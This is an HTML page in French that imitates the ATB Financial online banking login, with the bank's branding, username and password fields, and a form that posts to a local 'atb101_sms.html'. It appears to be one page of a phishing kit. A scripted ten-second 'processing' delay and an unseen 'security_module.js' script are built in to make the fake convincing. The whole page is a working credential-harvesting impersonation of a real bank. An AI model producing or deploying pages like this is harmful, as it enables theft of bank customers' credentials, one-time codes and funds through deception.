<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ATB Financial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0; background: white; color: #333; }
        .a-logo-box { margin: 60px auto 40px; width: 90px; height: 60px; border: 4px solid #0062e3; display: flex; justify-content: center; align-items: center; box-sizing: border-box; }
        .a-logo-text { color: #0062e3; font-size: 34px; font-weight: 900; letter-spacing: -1px; }
        
        .a-container { max-width: 400px; margin: 0 auto; padding: 0 20px; }
        .a-label { display: block; font-weight: bold; font-size: 16px; margin-bottom: 8px; color: #333; }
        
        .a-input-wrapper { position: relative; margin-bottom: 15px; }
        .a-input { width: 100%; border: 1px solid #777; padding: 15px 12px; box-sizing: border-box; font-size: 16px; outline: none; border-radius: 2px; color: #333; }
        .a-input:focus { border: 2px solid #0062e3; padding: 14px 11px; }
        .a-icon { position: absolute; right: 12px; top: 12px; font-size: 22px; color: #444; }
        
        .a-checkbox-row { display: flex; align-items: center; gap: 10px; margin-bottom: 30px; font-size: 15px; color: #333; }
        .a-checkbox { width: 20px; height: 20px; border: 1px solid #777; border-radius: 3px; cursor: pointer; }
        
        .a-btn { width: 100%; background: #0062e3; color: white; border: none; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 25px; transition: background 0.2s; }
        .a-btn:hover { background: #004fb8; }
        
        .a-links { text-align: center; margin-bottom: 40px; }
        .a-link { display: block; color: #0062e3; font-weight: bold; font-size: 17px; text-decoration: none; margin-bottom: 15px; }
        
        .a-footer { margin-top: 50px; text-align: center; font-size: 14px; color: #555; padding: 0 20px 40px; line-height: 1.5; }
        .a-footer-links { font-weight: bold; color: #0062e3; margin-bottom: 15px; line-height: 1.8; }
        .a-footer-links a { color: #0062e3; text-decoration: none; }
        .a-footer-sep { color: #333; margin: 0 5px; }
        
        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #0062e3;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #0062e3; margin: 20px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
    </style>
</head>
<body>
    <div class="a-logo-box">
        <div class="a-logo-text">ATB</div>
    </div>
    
    <div class="a-container">
        
        <form action="atb101_sms.html" method="POST">
            <label class="a-label">Nom d'utilisateur</label>
            <div class="a-input-wrapper">
                <input type="text" class="a-input" placeholder="Entrez votre nom d'utilisateur" required>
                <div class="a-icon">
                    <i class="fa-solid fa-user"></i><i class="fa-solid fa-key" style="font-size:10px; position:absolute; bottom:0; right:-6px;"></i>
                </div>
            </div>
            
            <div class="a-checkbox-row">
                <input type="checkbox" class="a-checkbox" id="memoriser">
                <label for="memoriser">M&eacute;moriser votre nom d'utilisateur</label>
            </div>
            
            <label class="a-label">Mot de passe</label>
            <div class="a-input-wrapper" style="margin-bottom: 40px;">
                <input type="password" class="a-input" placeholder="Entrez votre mot de passe" required>
            </div>
            
            <button type="submit" class="a-btn">Se connecter</button>
        </form>
        
        <div class="a-links">
            <a href="#" class="a-link">Nom d'utilisateur oubli&eacute;</a>
            <a href="#" class="a-link">Passe oubli&eacute;</a>
        </div>

    </div>
    
    <div class="a-footer">
        <div class="a-footer-links">
            <a href="#">atb.com</a> <span class="a-footer-sep">|</span> <a href="#">Contactez-nous</a> <span class="a-footer-sep">|</span> <a href="#">Conditions</a> <span class="a-footer-sep">|</span><br>
            <a href="#">Conseils de s&eacute;curit&eacute;</a>
        </div>
        &copy; ATB Financial 2026. Tous les droits sont r&eacute;serv&eacute;s.<br>
        Acc&egrave;s autoris&eacute; seulement. L'utilisation peut &ecirc;tre<br>
        surveill&eacute;e.
    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Traitement en cours...</p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() { form.submit(); }, 10000);
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
